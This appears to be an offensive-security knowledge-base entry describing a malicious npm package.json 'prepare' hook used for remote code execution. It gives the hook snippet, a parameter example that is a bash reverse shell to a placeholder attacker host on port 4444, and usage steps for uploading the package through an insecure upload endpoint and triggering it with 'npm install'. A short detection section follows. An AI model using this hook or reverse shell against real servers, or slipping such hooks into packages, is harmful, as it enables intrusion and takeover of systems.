---
id: cb2d7dc7-f58f-46ad-ba9e-59b505b4a21a
name: NPM-Package-JSON-Prepare-Script
type: code
language: js
verified: true
created_at: '2023-04-06T03:56:41.112499+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - rce
  - npm
  - hook
validated: true
---

# NPM-Package-JSON-Prepare-Script

## Code

```js
"scripts": {
    "prepare" : "/bin/touch /tmp/pwned.txt"
}
```

## Description

This JSON snippet defines a malicious 'prepare' script in an NPM package.json file. When the package is processed (e.g., via 'npm install' or 'npm run prepare'), the script executes the specified shell command, allowing arbitrary code execution on the server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `/bin/touch /tmp/pwned.txt` | The shell command to execute in the hook; customize for RCE (e.g., reverse shell) | `/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1` |

## Usage

Embed this snippet into a full package.json file and upload it via an insecure file upload endpoint. Trigger execution by running 'npm install' or 'npm run prepare' on the server, such as through a vulnerable application feature that installs user-uploaded packages.

## Detection

- Scan package.json files for suspicious 'scripts' sections containing shell commands (e.g., /bin/*, touch, nc).
- Monitor NPM install logs for unexpected command executions and file system changes in /tmp or other writable directories.
- Use static analysis tools like npm audit or custom scripts to detect hooks with external command invocations.

## Related

- [[procedures/Upload-Malicious-Package-Manager-Configurations-for-RCE]]
- [[commands/npm-run-prepare]]
